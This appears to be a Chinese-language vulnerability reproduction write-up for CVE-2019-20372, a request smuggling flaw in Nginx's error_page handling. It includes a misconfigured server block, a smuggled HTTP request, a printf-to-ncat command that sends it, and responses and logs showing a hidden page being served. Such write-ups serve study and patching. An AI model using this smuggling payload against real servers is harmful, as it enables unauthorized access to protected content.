<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2019-20372）Nginx error_page 请求走私漏洞</h1><h2>一、漏洞简介</h2><p>Nginx 1.17.7之前版本中 error_page 存在安全漏洞。攻击者可利用该漏洞读取未授权的Web页面。</p><h2>二、漏洞影响</h2><p>Ngnix &lt; 1.17.7</p><h2>三、复现过程</h2><p>错误配置</p><p>server {<br /> listen 80;<br /> server_name localhost;<br /> error_page 401 http://example.org;<br /> location / {<br /> return 401;<br /> }<br />}<br />server {<br /> listen 80;<br /> server_name notlocalhost;<br /> location /_hidden/index.html {<br /> return 200 'This should be hidden!';<br /> }<br />}</p><p>这时候我们可以向服务器发送以下请求</p><p>GET /a HTTP/1.1<br />Host: localhost<br />Content-Length: 56<br />GET /_hidden/index.html HTTP/1.1<br />Host: notlocalhost</p><p>我们看一下服务器是怎么处理的</p><p>printf "GET /a HTTP/1.1\r\nHost: localhost\r\nContent-Length: 56\r\n\r\nGET<br />/_hidden/index.html HTTP/1.1\r\nHost: notlocalhost\r\n\r\n" | ncat localhost 80 --noshutdown</p><p>等于说是吧两个请求都间接的执行了，我们看一下burp里面的返回值</p><p>HTTP/1.1 302 Moved Temporarily<br />Server: nginx/1.17.6<br />Date: Fri, 06 Dec 2019 18:23:33 GMT<br />Content-Type: text/html<br />Content-Length: 145<br />Connection: keep-alive<br />Location: http://example.org<br />&lt;html&gt;<br />&lt;head&gt;&lt;title&gt;302 Found&lt;/title&gt;&lt;/head&gt;<br />&lt;body&gt;<br />&lt;center&gt;&lt;h1&gt;302 Found&lt;/h1&gt;&lt;/center&gt;<br />&lt;hr&gt;&lt;center&gt;nginx/1.17.6&lt;/center&gt;<br />&lt;/body&gt;<br />&lt;/html&gt;<br />HTTP/1.1 200 OK<br />Server: nginx/1.17.6<br />Date: Fri, 06 Dec 2019 18:23:33 GMT<br />Content-Type: text/html<br />Content-Length: 22<br />Connection: keep-alive<br />This should be hidden!</p><p>再一下nginx服务器里面的日志</p><p>172.17.0.1 - - [06/Dec/2019:18:23:33 +0000] "GET /a HTTP/1.1" 302 145 "-" "-" "-"<br />172.17.0.1 - - [06/Dec/2019:18:23:33 +0000] "GET /_hidden/index.html HTTP/1.1" 200 22 "-"</p></body></html>